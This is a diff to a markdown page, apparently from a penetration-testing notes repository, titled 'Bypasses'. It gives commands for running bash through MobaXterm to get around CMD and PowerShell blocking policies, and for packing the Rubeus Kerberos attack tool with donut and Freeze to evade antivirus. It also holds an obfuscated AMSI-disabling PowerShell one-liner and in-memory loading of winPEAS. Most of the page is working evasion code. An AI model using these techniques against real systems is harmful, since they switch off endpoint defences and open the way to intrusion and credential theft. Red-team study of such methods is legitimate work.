@@ -1,8 +1,28 @@
-# Bypass Antivirus
+# Bypasses
+
+## CMD & Powershell Blocked Policy
+
+> Download [Mobaxterm](https://mobaxterm.mobatek.net/download-home-edition.html) and execute 
+
+```powershell
+bash.exe
+```
+
+## Powershell Scripts
+
+> Pendiente
+
+## Antivirus
+
+### donut + freeze
+
+```bash
+donut -i Rubeus.exe -o rubeus.bin
+Freeze -I rubeus.bin -O rubeus.exe
+```
 
 
-
-## AMSI bypass
+### AMSI bypass
 
 Create a file amsi_rmouse.txt
 
@@ -54,7 +74,7 @@ $assem = [System.Reflection.Assembly]::Load($data);
 [File.Program]::MainString("arguments");
 ```
 
-## Winpeas bypass
+### Winpeas bypass
 
 Download latest version of [winpeas_any_ofs.exe](https://github.com/carlospolop/PEASS-ng/releases/)
 
@@ -65,7 +85,7 @@ $out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($s
 [winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
 ```
 
-## Rubeus bypass
+### Rubeus bypass
 
 ```powershell
 $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
@@ -90,10 +110,10 @@ Invoke-EncodeAssembly -binaryPath .\winPEAS.exe -namespace winPEAS -capture $tru
 - https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
 
 
-## with Tools
+### with Tools
 
 
-### Freeze
+#### Freeze
 
 
 ```bash
